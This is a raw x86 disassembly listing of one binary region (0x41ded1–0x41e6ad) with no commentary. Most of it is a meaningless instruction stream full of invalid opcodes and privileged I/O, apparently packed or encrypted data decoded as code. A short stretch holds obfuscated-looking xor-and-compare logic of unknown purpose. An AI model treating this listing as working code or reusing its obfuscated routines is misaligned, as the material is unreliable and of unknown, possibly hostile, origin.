  41ded1:	mov    WORD PTR [esi+0x736d081e],ds
  41ded7:	sbb    eax,0x68d07e91
  41dedc:	dec    edi
  41dedd:	jae    0x41de75
  41dedf:	add    ebp,DWORD PTR [ecx+esi*1-0x3ccf075d]
  41dee6:	loop   0x41ded8
  41dee8:	aam    0xc9
  41deea:	inc    eax
  41deeb:	lods   al,BYTE PTR ds:[esi]
  41deec:	cld    
  41deed:	bts    DWORD PTR [edi+0x15b0cf21],edi
  41def4:	int    0xdc
  41def6:	int    0xdb
  41def8:	aas    
  41def9:	ror    edi,0x1e
  41defc:	xchg   ebx,eax
  41defd:	and    eax,0x61fe8324
  41df02:	add    al,0xb9
  41df04:	dec    esi
  41df05:	mov    edx,0x2508d692
  41df0a:	js     0x41df1e
  41df0c:	sub    dl,dh
  41df0e:	in     eax,dx
  41df0f:	out    0xe,al
  41df11:	leave  
  41df12:	jecxz  0x41df3c
  41df14:	retf   
  41df15:	shl    DWORD PTR [eax-0x7d],cl
  41df18:	in     al,0xd6
  41df1a:	push   es
  41df1b:	push   ecx
  41df1c:	adc    bh,BYTE PTR [ebx-0x618d25c8]
  41df22:	int3   
  41df23:	sahf   
  41df24:	and    ebx,DWORD PTR [eax]
  41df26:	ins    DWORD PTR es:[edi],dx
  41df27:	pop    edi
  41df28:	mov    ds:0xe7323917,al
  41df2d:	sub    bl,BYTE PTR [esi+0x4a]
  41df30:	or     ah,BYTE PTR [ebx]
  41df32:	or     edi,DWORD PTR [edx-0x5f34618a]
  41df38:	les    ebp,FWORD PTR [edx]
  41df3a:	ins    DWORD PTR es:[edi],dx
  41df3b:	inc    edi
  41df3c:	mov    eax,0xd6ff6165
  41df41:	lock sbb BYTE PTR [ecx+ecx*2],ah
  41df45:	ins    BYTE PTR es:[edi],dx
  41df46:	ficom  DWORD PTR [ecx-0x31]
  41df49:	test   eax,0x9053aa53
  41df4e:	out    dx,al
  41df4f:	mov    esp,esi
  41df51:	push   eax
  41df52:	mov    al,ds:0x260a39b4
  41df57:	jno    0x41df84
  41df59:	dec    ebp
  41df5a:	inc    ecx
  41df5b:	or     edi,ecx
  41df5d:	cmp    eax,0x9110a925
  41df62:	div    BYTE PTR [eax-0x57]
  41df65:	outs   dx,DWORD PTR ds:[esi]
  41df66:	sahf   
  41df67:	or     ah,BYTE PTR [ecx-0x3c]
  41df6a:	call   0x5c67d468
  41df6f:	sub    eax,0x47bc39cd
  41df74:	cwde   
  41df75:	sub    cl,BYTE PTR [edx]
  41df77:	adc    dh,ah
  41df79:	dec    ebp
  41df7a:	retf   
  41df7b:	aas    
  41df7c:	scas   al,BYTE PTR es:[edi]
  41df7d:	sub    al,0x3
  41df7f:	and    al,0x50
  41df81:	jg     0x41df72
  41df83:	sbb    ch,bl
  41df85:	fldcw  WORD PTR [ebx-0x5cd2cb15]
  41df8b:	jnp    0x41df57
  41df8d:	rcl    BYTE PTR [ebx-0x39130bce],1
  41df93:	xchg   DWORD PTR [esp+ebp*8+0x17],edi
  41df97:	lds    esi,FWORD PTR [esi-0x76ce7db]
  41df9d:	and    BYTE PTR [ebp-0x51],ch
  41dfa0:	push   eax
  41dfa1:	xchg   DWORD PTR [ebp-0x4b],esi
  41dfa4:	sbb    al,BYTE PTR [ebx+esi*1+0x5288f7bd]
  41dfab:	fst    st(7)
  41dfad:	lahf   
  41dfae:	lahf   
  41dfaf:	mov    ah,0x59
  41dfb1:	sub    dl,BYTE PTR [ecx-0x30ab449c]
  41dfb7:	loopne 0x41df8b
  41dfb9:	out    dx,eax
  41dfba:	aaa    
  41dfbb:	jbe    0x41df5b
  41dfbd:	push   eax
  41dfbe:	xchg   esp,eax
  41dfbf:	adc    edi,edi
  41dfc1:	jmp    FWORD PTR [edi+0x26]
  41dfc4:	push   esi
  41dfc5:	sub    al,0x20
  41dfc7:	shl    DWORD PTR [ecx+0x7d0570d8],0x98
  41dfce:	pop    ebp
  41dfcf:	xor    bh,bl
  41dfd1:	iret   
  41dfd2:	lock pop ebx
  41dfd4:	aad    0x38
  41dfd6:	or     ebp,esp
  41dfd8:	add    al,0x5d
  41dfda:	(bad)  [edi+0x1c]
  41dfdd:	and    eax,0xce9826fc
  41dfe2:	inc    esi
  41dfe3:	jno    0x41dfd6
  41dfe5:	mov    ds:0x2ea8b863,eax
  41dfea:	aad    0x51
  41dfec:	test   BYTE PTR [edi-0x3d],bh
  41dfef:	push   es
  41dff0:	fisubr WORD PTR [edi+0x7]
  41dff3:	fcmovb st,st(1)
  41dff5:	sbb    ecx,DWORD PTR [eax]
  41dff7:	cld    
  41dff8:	(bad)  
  41dff9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dffa:	adc    eax,0x5b99da09
  41dfff:	fnstsw WORD PTR [edx+ebx*8]
  41e002:	adc    al,0x55
  41e004:	push   ebp
  41e005:	cmp    eax,0x80daf1f7
  41e00a:	sbb    ch,BYTE PTR [edi+edi*1-0x66d4e4e8]
  41e011:	inc    edx
  41e012:	pop    edi
  41e013:	loope  0x41e086
  41e015:	add    dl,BYTE PTR [edi]
  41e017:	xchg   DWORD PTR [edx+0x2221bacb],esp
  41e01d:	stc    
  41e01e:	jb     0x41dfdf
  41e020:	mov    eax,es:0x4cd59556
  41e026:	loope  0x41dfcb
  41e028:	int    0x89
  41e02a:	jnp    0x41dfd9
  41e02c:	leave  
  41e02d:	and    ebp,DWORD PTR [esi]
  41e02f:	cmp    DWORD PTR [eax+0x444cb7fc],edx
  41e035:	shl    DWORD PTR [edi-0x5fe26c8b],1
  41e03b:	test   DWORD PTR [edi+0x760a7feb],eax
  41e041:	jl     0x41dfef
  41e043:	sbb    al,0x82
  41e045:	imul   ecx,DWORD PTR [edi-0x309c4b4d],0xffffff86
  41e04c:	lahf   
  41e04d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e04e:	pop    DWORD PTR [ebx]
  41e050:	sbb    esp,DWORD PTR [edx-0x76]
  41e053:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e054:	add    dl,bl
  41e056:	mov    bh,0xb7
  41e058:	add    edi,0xffffff8c
  41e05b:	in     al,0x8c
  41e05d:	inc    ebp
  41e05e:	inc    ebx
  41e05f:	ss jno 0x41e036
  41e062:	test   DWORD PTR [esi+0x27ea2190],esp
  41e068:	sbb    bl,BYTE PTR [ebp+0x13]
  41e06b:	out    dx,eax
  41e06c:	loop   0x41e013
  41e06e:	pop    esi
  41e06f:	lds    ecx,FWORD PTR [eax]
  41e071:	js     0x41e057
  41e073:	hlt    
  41e074:	sahf   
  41e075:	xchg   BYTE PTR [edx+eiz*2],bh
  41e078:	ins    BYTE PTR es:[edi],dx
  41e079:	mov    ah,0xd9
  41e07b:	push   0x87ed5da8
  41e080:	(bad)  
  41e082:	jmp    0x6bff64f4
  41e087:	loopne 0x41e079
  41e089:	cs pop es
  41e08b:	jno    0x41e066
  41e08d:	xchg   esi,eax
  41e08e:	sbb    al,0x5
  41e090:	xor    eax,0xff288e59
  41e095:	cmp    eax,0x878785ef
  41e09a:	les    esi,FWORD PTR [ecx]
  41e09c:	aam    0x79
  41e09e:	idiv   BYTE PTR [edi]
  41e0a0:	out    dx,al
  41e0a1:	lahf   
  41e0a2:	repz jle 0x41e0e7
  41e0a5:	push   0xffffffd5
  41e0a7:	push   ebx
  41e0a8:	or     al,0x1e
  41e0aa:	jg     0x41e04c
  41e0ac:	in     al,0x7b
  41e0ae:	fs mov al,0x65
  41e0b1:	repnz ins BYTE PTR es:[edi],dx
  41e0b3:	pusha  
  41e0b4:	test   DWORD PTR [ebp+eiz*1+0x53],ebp
  41e0b8:	lea    ebx,[esi+0x41915a83]
  41e0be:	dec    edx
  41e0bf:	pop    ebp
  41e0c0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e0c1:	(bad)  
  41e0c2:	fisttp QWORD PTR ss:[edi-0x4fb04a24]
  41e0c9:	add    dh,ah
  41e0cb:	pop    esi
  41e0cc:	and    DWORD PTR [ebx-0x7],ebp
  41e0cf:	call   0x3183:0x6b344f47
  41e0d6:	adc    ch,bl
  41e0d8:	arpl   WORD PTR [eax],sp
  41e0da:	fmul   st,st(5)
  41e0dc:	iret   
  41e0dd:	pop    edx
  41e0de:	mov    cl,0x9e
  41e0e0:	mov    bh,0xf4
  41e0e2:	imul   ebp,ebp,0x70923afe
  41e0e8:	dec    ebx
  41e0e9:	xor    dl,BYTE PTR [ecx+0x3a]
  41e0ec:	call   FWORD PTR [edi+edi*8]
  41e0ef:	pop    ds
  41e0f0:	into   
  41e0f1:	adc    edx,DWORD PTR [edi+0x13eea02]
  41e0f7:	jmp    ecx
  41e0f9:	ficomp DWORD PTR [ebp-0x42]
  41e0fc:	mov    ebx,0x5ad891d8
  41e101:	gs pop ds
  41e103:	cdq    
  41e104:	cli    
  41e105:	int    0x7c
  41e107:	aam    0xd9
  41e109:	(bad)  
  41e10a:	je     0x41e15b
  41e10c:	cmp    esi,DWORD PTR [ebp-0x447feab7]
  41e112:	inc    eax
  41e113:	and    ebx,DWORD PTR [eax+esi*4+0x44c7ce92]
  41e11a:	and    al,0x10
  41e11c:	sbb    al,BYTE PTR [edx+0x0]
  41e11f:	add    BYTE PTR [ebx+0x25102444],cl
  41e125:	inc    esp
  41e126:	ret    0xffff
  41e129:	add    eax,DWORD PTR [esp+0x30]
  41e12d:	and    eax,0xfffffe5a
  41e132:	sub    eax,0x2ae1
  41e137:	and    eax,0x6f90
  41e13c:	mov    DWORD PTR [esp+0x30],eax
  41e140:	mov    DWORD PTR [esp+0x10],0x1515
  41e148:	mov    eax,DWORD PTR [esp+0x10]
  41e14c:	mov    ecx,DWORD PTR [esp+0x30]
  41e150:	or     eax,0x7113
  41e155:	add    eax,0x3d6a
  41e15a:	cmp    ecx,eax
  41e15c:	je     0x41e9ea
  41e162:	mov    eax,DWORD PTR [esp+0x40]
  41e166:	mov    edx,DWORD PTR [esp+0x18]
  41e16a:	mov    edi,DWORD PTR [esp+0x1c]
  41e16e:	xor    ecx,ecx
  41e170:	shld   ecx,eax,0x2
  41e174:	shl    eax,0x2
  41e177:	xor    eax,ebx
  41e179:	xor    ecx,esi
  41e17b:	cmp    eax,edx
  41e17d:	jne    0x41e18b
  41e183:	cmp    ecx,edi
  41e185:	je     0x41e9a3
  41e18b:	mov    eax,DWORD PTR [esp+0x44]
  41e18f:	mov    eax,DWORD PTR [esp+0x44]
  41e193:	mov    eax,DWORD PTR [esp+0x44]
  41e197:	mov    ecx,DWORD PTR [esp+0x44]
  41e19b:	xor    eax,0xa4069aaf
  41e1a0:	xor    ecx,0xfffffffe
  41e1a3:	shr    eax,0x2
  41e1a6:	shl    ecx,0x1e
  41e1a9:	or     eax,ecx
  41e1ab:	xor    ecx,ecx
  41e1ad:	shld   ecx,eax,0x2
  41e1b1:	shl    eax,0x2
  41e1b4:	xor    eax,ebx
  41e1b6:	xor    ecx,esi
  41e1b8:	cmp    eax,0xca79a571
  41e1bd:	jne    0x41e1cb
  41e1c3:	cmp    ecx,esi
  41e1c5:	je     0x41e9ea
  41e1cb:	mov    eax,DWORD PTR [esp+0x60]
  41e1cf:	cdq    
  41e1d0:	mov    eax,DWORD PTR [esp+0x60]
  41e1d4:	mov    ecx,edx
  41e1d6:	cdq    
  41e1d7:	shld   edx,eax,0x2
  41e1db:	shr    ecx,0x1e
  41e1de:	xor    edi,edi
  41e1e0:	jmp    0x41e5af
  41e1e5:	inc    esp
  41e1e6:	mov    eax,ds:0x1a1c22c9
  41e1eb:	and    bl,BYTE PTR [edi+0x7e4d5dcf]
  41e1f1:	aas    
  41e1f2:	jle    0x41e25b
  41e1f4:	mov    esp,0x18163fc6
  41e1f9:	mov    esp,0xe9181812
  41e1fe:	ret    0xdf57
  41e201:	dec    ebp
  41e202:	fidivr WORD PTR [esp+ebx*8+0x5a6ac1c1]
  41e209:	mov    ebp,0xcc9cfab1
  41e20e:	inc    ebx
  41e20f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e210:	dec    esp
  41e211:	push   0xb2c871c4
  41e216:	mov    BYTE PTR [ebp-0x5ac02e40],ch
  41e21c:	push   0xfffffff7
  41e21e:	sub    BYTE PTR [edi+edi*1+0x3949b099],dh
  41e225:	aam    0x3a
  41e227:	in     al,0xe6
  41e229:	cmp    BYTE PTR [edi],0x3c
  41e22c:	rcl    DWORD PTR [ecx+0x374dab66],0x36
  41e233:	rcl    BYTE PTR [ebp+0x38],1
  41e236:	mov    bh,0xe6
  41e238:	push   ebp
  41e239:	mov    esp,0x65c513ce
  41e23e:	sub    ah,al
  41e240:	test   ah,ch
  41e242:	pop    esi
  41e243:	pop    esp
  41e244:	push   ds
  41e245:	call   0x5e2a:0xcd16205e
  41e24c:	pop    ebp
  41e24d:	lock lahf 
  41e24f:	rcl    edi,0x51
  41e252:	dec    edi
  41e253:	sub    BYTE PTR [ecx-0x1c57e560],ah
  41e259:	daa    
  41e25a:	mov    WORD PTR [eax],cs
  41e25c:	jbe    0x41e1f0
  41e25e:	scas   al,BYTE PTR es:[edi]
  41e25f:	fld    QWORD PTR [edx-0x2c40c164]
  41e265:	fld    TBYTE PTR [esi-0xfa51b9]
  41e26b:	call   0xf3b7d93c
  41e270:	adc    DWORD PTR [edi-0x771bf3ff],ebp
  41e276:	adc    eax,0xc0e8f042
  41e27b:	jp     0x41e22c
  41e27d:	enter  0x8bd3,0x99
  41e281:	jl     0x41e300
  41e283:	xchg   esp,eax
  41e284:	repz push ebp
  41e286:	aas    
  41e287:	imul   eax,DWORD PTR [esi-0x7d2185ba],0xc2cae637
  41e291:	sub    eax,0xf4dee150
  41e296:	dec    eax
  41e297:	jle    0x41e28f
  41e299:	leave  
  41e29a:	or     eax,0x5dfddac3
  41e29f:	mov    eax,ds:0x70054254
  41e2a4:	hlt    
  41e2a5:	adc    ch,ch
  41e2a7:	pop    ebx
  41e2a8:	jo     0x41e2c2
  41e2aa:	ds xchg edi,eax
  41e2ac:	cmp    al,dh
  41e2ae:	or     esi,ebx
  41e2b0:	int    0xfb
  41e2b2:	and    eax,0xb4922e25
  41e2b7:	sub    edi,esp
  41e2b9:	lods   eax,DWORD PTR ds:[esi]
  41e2ba:	das    
  41e2bb:	jge    0x41e241
  41e2bd:	int3   
  41e2be:	sub    DWORD PTR [ecx],ebx
  41e2c0:	sub    BYTE PTR [edi*8-0x4f8ad339],bh
  41e2c7:	test   al,0x3
  41e2c9:	je     0x41e2a8
  41e2cb:	fdivr  DWORD PTR [edi+0x7fcb2e43]
  41e2d1:	mov    eax,0x7dc841ac
  41e2d6:	out    dx,eax
  41e2d7:	dec    ebp
  41e2d8:	cmp    BYTE PTR [ebx+0x58],ch
  41e2db:	loopne 0x41e260
  41e2dd:	lock test eax,0xcac36942
  41e2e3:	ins    DWORD PTR es:[edi],dx
  41e2e4:	aaa    
  41e2e5:	mov    ebx,DWORD PTR [ecx+0x32]
  41e2e8:	pusha  
  41e2e9:	push   edi
  41e2ea:	xchg   esi,eax
  41e2eb:	mov    bl,0x3e
  41e2ed:	test   BYTE PTR [eax+0x63],0xfc
  41e2f1:	mov    eax,ds:0x9c4a6cc3
  41e2f6:	lds    ebp,FWORD PTR [esi]
  41e2f8:	stos   BYTE PTR es:[edi],al
  41e2f9:	sub    eax,0x28596e43
  41e2fe:	pop    ebp
  41e2ff:	push   cs
  41e300:	sbb    bh,bh
  41e302:	rol    BYTE PTR ds:0xc320e8a2,1
  41e308:	fldcw  WORD PTR [edx+edi*4+0x43]
  41e30c:	mov    ds:0x54474068,al
  41e311:	inc    esi
  41e312:	fbld   TBYTE PTR [edx+0x12]
  41e315:	ins    DWORD PTR es:[edi],dx
  41e316:	xor    ecx,DWORD PTR [ebp+0x3e]
  41e319:	jae    0x41e2a9
  41e31b:	stos   BYTE PTR es:[edi],al
  41e31c:	(bad)  
  41e31e:	xor    dh,BYTE PTR cs:[ebx-0x775f674f]
  41e325:	or     eax,0x8540dc43
  41e32a:	or     ebx,DWORD PTR [eax+0x4a2b91cf]
  41e330:	sub    ah,ah
  41e332:	and    eax,0x4448a119
  41e337:	std    
  41e338:	cmp    bl,BYTE PTR [edx]
  41e33a:	outs   dx,DWORD PTR ds:[esi]
  41e33b:	mov    eax,0x7854b555
  41e340:	mov    al,0x3f
  41e342:	in     eax,dx
  41e343:	pop    ds
  41e344:	push   ds
  41e345:	push   edx
  41e346:	add    dl,BYTE PTR [edi-0x6057daf7]
  41e34c:	out    0x44,eax
  41e34e:	mov    esi,0xcfff5783
  41e353:	repnz dec ecx
  41e355:	rcr    esi,0x17
  41e358:	push   ebp
  41e359:	int3   
  41e35a:	add    BYTE PTR [ebp-0x49],0x4f
  41e35e:	mov    esp,0xf4918df
  41e363:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e364:	daa    
  41e365:	push   ebx
  41e366:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e367:	pushf  
  41e368:	jnp    0x41e372
  41e36a:	and    BYTE PTR [esi-0x4074ea6f],bh
  41e370:	jmp    0x41e33d
  41e372:	stc    
  41e373:	shr    ah,0x41
  41e376:	jae    0x41e3f4
  41e378:	arpl   ax,cx
  41e37a:	fld    TBYTE PTR [esi]
  41e37c:	lock arpl WORD PTR [edx-0x19],bx
  41e380:	cmc    
  41e381:	inc    eax
  41e382:	inc    esi
  41e383:	sub    DWORD PTR fs:[esi],ebx
  41e386:	js     0x41e353
  41e388:	mov    esi,0xf9761a3c
  41e38d:	mov    edx,0x1382e467
  41e392:	or     ah,ch
  41e394:	jae    0x41e356
  41e396:	fisttp WORD PTR [ebx-0x1268f295]
  41e39c:	movntps XMMWORD PTR [ebx-0x1f],xmm0
  41e3a0:	adc    eax,DWORD PTR [edi+edi*8]
  41e3a3:	shr    DWORD PTR [esi-0x1eb89045],1
  41e3a9:	das    
  41e3aa:	sbb    dl,BYTE PTR [ecx]
  41e3ac:	test   DWORD PTR [ebx-0x1c2dd98f],0x2598079e
  41e3b6:	or     esi,DWORD PTR [ebp-0xb]
  41e3b9:	aam    0x5c
  41e3bb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e3bc:	lods   eax,DWORD PTR ds:[esi]
  41e3bd:	or     ebp,ebx
  41e3bf:	cmp    eax,0xbdf5a623
  41e3c4:	adc    DWORD PTR [eax-0x35e3e79b],edx
  41e3ca:	mov    al,0x50
  41e3cc:	pop    esp
  41e3cd:	sub    ah,dl
  41e3cf:	nop
  41e3d0:	push   edi
  41e3d1:	dec    esi
  41e3d2:	jo     0x41e420
  41e3d4:	stos   BYTE PTR es:[edi],al
  41e3d5:	rcl    BYTE PTR [ecx],cl
  41e3d7:	jae    0x41e43d
  41e3d9:	mov    ds:0x82eb630,eax
  41e3de:	bound  ebx,QWORD PTR [edx]
  41e3e0:	ficom  WORD PTR [eax+0x75]
  41e3e3:	sbb    eax,0x9f5fbae0
  41e3e8:	gs sahf 
  41e3ea:	push   0x3f12c185
  41e3ef:	jg     0x41e460
  41e3f1:	jecxz  0x41e388
  41e3f3:	pop    ebp
  41e3f4:	(bad)  
  41e3f5:	loopne 0x41e46c
  41e3f7:	fdivr  DWORD PTR [edi-0x3667bbf5]
  41e3fd:	cli    
  41e3fe:	nop
  41e3ff:	xor    ebp,esp
  41e401:	dec    ebp
  41e402:	mov    ah,0x3a
  41e404:	jmp    0x90f6165b
  41e409:	mov    cl,0xfc
  41e40b:	data16 scas al,BYTE PTR es:[edi]
  41e40d:	add    ah,BYTE PTR [esi+0x311dfdd]
  41e413:	mov    dl,0x7a
  41e415:	push   eax
  41e416:	cmp    cl,BYTE PTR [edx+0x1d]
  41e419:	not    DWORD PTR [ecx+0x70]
  41e41c:	xchg   DWORD PTR [esi],esp
  41e41e:	call   DWORD PTR [edx-0x51]
  41e421:	ret    
  41e422:	out    dx,al
  41e423:	(bad)  
  41e424:	dec    edi
  41e425:	imul   edi,DWORD PTR [edx-0x3c],0xffffffbe
  41e429:	stos   BYTE PTR es:[edi],al
  41e42a:	test   DWORD PTR [esi],ebp
  41e42c:	mov    ah,0xa6
  41e42e:	mov    WORD PTR [edi-0x53028da1],?
  41e434:	ins    BYTE PTR es:[edi],dx
  41e435:	sbb    DWORD PTR [edi+0x172e51e5],esi
  41e43b:	push   edx
  41e43c:	inc    esi
  41e43d:	mov    ecx,0x1591d49c
  41e442:	imul   esi,eax,0x701e7a57
  41e448:	and    eax,0x7e3513b0
  41e44d:	xchg   ecx,eax
  41e44e:	push   edx
  41e44f:	mov    ch,BYTE PTR [eax+0x63]
  41e452:	pop    eax
  41e453:	pop    ecx
  41e454:	add    al,0xa5
  41e456:	test   dl,bl
  41e458:	mov    edx,0x7e4836cb
  41e45d:	push   edi
  41e45e:	loope  0x41e40e
  41e460:	stc    
  41e461:	out    0x8c,eax
  41e463:	xor    eax,0x1218582a
  41e468:	push   ecx
  41e469:	cmp    eax,0xf23ee7d1
  41e46e:	out    0x90,eax
  41e470:	mov    eax,ds:0x41094df7
  41e475:	outs   dx,DWORD PTR ds:[esi]
  41e476:	fs add al,0x59
  41e479:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e47a:	jbe    0x41e42a
  41e47c:	in     al,0xd3
  41e47e:	mov    ds:0x4ee3ff9d,eax
  41e483:	fsubrp st(7),st
  41e485:	(bad)  
  41e486:	out    dx,eax
  41e487:	xchg   edi,eax
  41e488:	mov    ds:0xaca5cd07,eax
  41e48d:	daa    
  41e48e:	(bad)  
  41e490:	fldenv [ecx]
  41e492:	mov    bl,0xc9
  41e494:	dec    esp
  41e495:	add    al,0x5
  41e497:	ja     0x41e430
  41e499:	mov    esi,0xfd97b646
  41e49e:	rol    DWORD PTR [ebp+0x16c77a03],cl
  41e4a4:	mov    DWORD PTR [edi+0x26],edi
  41e4a7:	fld    TBYTE PTR [edx+0x4]
  41e4aa:	test   DWORD PTR [ecx],eax
  41e4ac:	jmp    0x9c881b55
  41e4b1:	out    dx,eax
  41e4b2:	push   cs
  41e4b3:	aam    0x9e
  41e4b5:	(bad)  
  41e4b6:	xor    eax,DWORD PTR [eax-0x5e]
  41e4b9:	inc    ecx
  41e4ba:	aad    0xa
  41e4bc:	mov    eax,ds:0x79bfba12
  41e4c1:	test   al,0xe4
  41e4c3:	mov    bh,0xb8
  41e4c5:	mov    bl,0x4d
  41e4c7:	mov    cl,0x58
  41e4c9:	push   ds
  41e4ca:	mov    esi,DWORD PTR [ebx+0x1fb23674]
  41e4d0:	pusha  
  41e4d1:	pop    ebx
  41e4d2:	dec    ecx
  41e4d3:	cs jg  0x41e510
  41e4d6:	ins    DWORD PTR es:[edi],dx
  41e4d7:	sti    
  41e4d8:	(bad)  
  41e4d9:	jg     0x41e51d
  41e4db:	adc    BYTE PTR [edi+0x61d6893f],0xae
  41e4e2:	sbb    dh,BYTE PTR [eiz*1+0x2389df6f]
  41e4e9:	xor    DWORD PTR [edi+0x2547a6b],esi
  41e4ef:	xchg   edi,eax
  41e4f0:	loopne 0x41e4c4
  41e4f2:	pushf  
  41e4f3:	test   BYTE PTR [ebp+0x63],0x20
  41e4f7:	adc    al,0xe8
  41e4f9:	ret    
  41e4fa:	mov    eax,0x3706b571
  41e4ff:	lea    edi,[edi]
  41e501:	add    esp,DWORD PTR [ebp+0x57]
  41e504:	jle    0x41e486
  41e506:	adc    WORD PTR [esi+0x487f0d33],dx
  41e50d:	clc    
  41e50e:	mov    ebp,0x63a5e440
  41e513:	or     BYTE PTR [esp+eax*2+0x69],ah
  41e517:	mov    cl,0xbe
  41e519:	jnp    0x41e4df
  41e51b:	in     al,0x7
  41e51d:	popa   
  41e51e:	mov    ecx,0x3e4e6c65
  41e523:	sbb    al,0xe0
  41e526:	(bad)  
  41e527:	push   eax
  41e528:	add    DWORD PTR [edi-0x70],esp
  41e52b:	jge    0x41e4b1
  41e52d:	jmp    0x41e4fa
  41e52f:	jne    0x41e5a1
  41e531:	mov    edx,0x1eb2299f
  41e536:	mov    esi,0x9508e32
  41e53b:	shl    edi,cl
  41e53d:	sub    eax,0x738499ee
  41e542:	mov    ah,0x20
  41e544:	in     al,0x37
  41e546:	fst    st(1)
  41e548:	ror    DWORD PTR [edi],cl
  41e54a:	out    0xae,eax
  41e54c:	mov    cs,WORD PTR [esi]
  41e54e:	mov    cl,0xbd
  41e550:	(bad)  
  41e551:	push   esi
  41e552:	mov    esp,0x97d4d380
  41e557:	dec    edx
  41e558:	pop    ss
  41e559:	push   esp
  41e55a:	clc    
  41e55b:	je     0x41e52a
  41e55d:	and    DWORD PTR ds:[esi+0x125c7b50],eax
  41e564:	call   0x7c18:0xa6fb
  41e56a:	push   ss
  41e56b:	rcl    DWORD PTR [esi+0x15],1
  41e56e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e56f:	int3   
  41e570:	xor    dh,ch
  41e572:	enter  0x6a0,0x8e
  41e576:	xor    al,BYTE PTR [edx]
  41e578:	pop    esi
  41e579:	js     0x41e55d
  41e57b:	lods   al,BYTE PTR ds:[esi]
  41e57c:	jbe    0x41e59a
  41e57e:	xor    al,0x60
  41e580:	add    ebp,DWORD PTR [esi]
  41e582:	in     eax,dx
  41e583:	pop    esp
  41e584:	sahf   
  41e585:	cs jne 0x41e557
  41e588:	lahf   
  41e589:	jp     0x41e57d
  41e58b:	popf   
  41e58c:	adc    edx,DWORD PTR ds:0x69b05c33
  41e592:	inc    esp
  41e593:	adc    eax,0x7bc1350c
  41e598:	add    al,dh
  41e59a:	loop   0x41e528
  41e59c:	jae    0x41e572
  41e59e:	cmp    eax,0x795a3cdf
  41e5a3:	mov    dl,BYTE PTR [eax]
  41e5a5:	pop    ebx
  41e5a6:	cmp    cl,BYTE PTR [ebx+0x17d64117]
  41e5ac:	add    al,0xa8
  41e5ae:	rol    cl,1
  41e5b0:	loopne 0x41e5b4
  41e5b2:	or     eax,ecx
  41e5b4:	jmp    0x41e983
  41e5b9:	test   BYTE PTR [esi],cl
  41e5bb:	nop
  41e5bc:	lahf   
  41e5bd:	jp     0x41e5dd
  41e5bf:	and    ch,BYTE PTR [edx]
  41e5c1:	xor    eax,0x2daae715
  41e5c6:	jae    0x41e571
  41e5c8:	mov    esp,0x1816376b
  41e5cd:	mov    esp,0x31181812
  41e5d2:	jb     0x41e61e
  41e5d4:	loope  0x41e623
  41e5d6:	dec    esi
  41e5d7:	pop    ebp
  41e5d8:	in     eax,dx
  41e5d9:	(bad)  
  41e5da:	ficom  WORD PTR [edi-0x59]
  41e5dd:	loope  0x41e585
  41e5df:	xchg   edx,eax
  41e5e0:	ja     0x41e5d0
  41e5e2:	cmp    al,0x9c
  41e5e4:	mov    bh,0xe9
  41e5e6:	pop    gs
  41e5e8:	push   ss
  41e5e9:	mov    ds:0x1bbaa1d2,al
  41e5ee:	fidiv  WORD PTR [eax]
  41e5f0:	cld    
  41e5f1:	imul   edi,DWORD PTR [eax],0xbc536410
  41e5f7:	push   ss
  41e5f8:	stc    
  41e5f9:	imul   esi,ecx,0xb1115dfe
  41e5ff:	sbb    ebp,esi
  41e601:	push   esi
  41e602:	push   ecx
  41e603:	fwait
  41e604:	mov    bl,0x8d
  41e606:	xor    ch,BYTE PTR [esi+0x2514b1a3]
  41e60c:	or     al,0x22
  41e60e:	pop    esi
  41e60f:	das    
  41e610:	call   0x858f:0x609f05c6
  41e617:	ret    0x1474
  41e61a:	shr    BYTE PTR [eax-0x7e],cl
  41e61d:	int3   
  41e61e:	push   0xe1cc39f
  41e623:	sub    eax,0x3a6d3646
  41e628:	push   ebx
  41e629:	xor    dh,dl
  41e62b:	test   eax,0x13c11e6a
  41e630:	sbb    ch,al
  41e632:	xchg   esp,eax
  41e633:	pop    ebp
  41e634:	std    
  41e635:	rcl    DWORD PTR [ebp-0x63],cl
  41e638:	mov    esi,0xe7f4ce4a
  41e63d:	jg     0x41e694
  41e63f:	loopne 0x41e61b
  41e641:	push   ecx
  41e642:	ret    0xddbf
  41e645:	les    edx,FWORD PTR [esi+ebx*4+0x74672df9]
  41e64c:	mov    dh,0x23
  41e64e:	mov    ebp,0xffd84988
  41e653:	or     DWORD PTR [eax+0x462656d5],0xef841622
  41e65d:	in     eax,dx
  41e65e:	aas    
  41e65f:	mov    edi,0xfda8f1e
  41e664:	mov    edi,0xa6fc933a
  41e669:	pop    edi
  41e66a:	aad    0x6b
  41e66c:	pop    edi
  41e66d:	jns    0x41e64f
  41e66f:	pop    ecx
  41e670:	sub    BYTE PTR [esp+ecx*2],al
  41e673:	dec    edi
  41e674:	xchg   BYTE PTR [esp+eiz*2],ah
  41e677:	push   ds
  41e678:	mov    BYTE PTR [edx-0x7],bl
  41e67b:	jmp    0x41e66f
  41e67d:	and    bl,BYTE PTR [ebx+0x28]
  41e680:	pop    edx
  41e681:	or     ch,BYTE PTR [eax]
  41e683:	mov    dh,0x59
  41e685:	jne    0x41e6a6
  41e687:	inc    esp
  41e688:	bound  ebp,QWORD PTR [ecx]
  41e68a:	xlat   BYTE PTR ds:[ebx]
  41e68b:	repnz mov cl,0xd4
  41e68e:	and    bl,BYTE PTR [edi+0x4e]
  41e691:	jb     0x41e646
  41e693:	fcom   DWORD PTR [edx]
  41e695:	icebp  
  41e696:	dec    esp
  41e697:	stos   BYTE PTR es:[edi],al
  41e698:	lods   al,BYTE PTR ds:[esi]
  41e699:	stos   DWORD PTR es:[edi],eax
  41e69a:	mov    al,0x33
  41e69c:	int    0x7e
  41e69e:	xchg   ecx,eax
  41e69f:	push   edx
  41e6a0:	adc    esi,DWORD PTR [ebp+0x55]
  41e6a3:	aad    0x2e
  41e6a5:	pop    esi
  41e6a6:	mov    al,ds:0x3a4d716a
  41e6ab:	lahf   
  41e6ac:	pop    ebp
  41e6ad:	xor    al,0x22
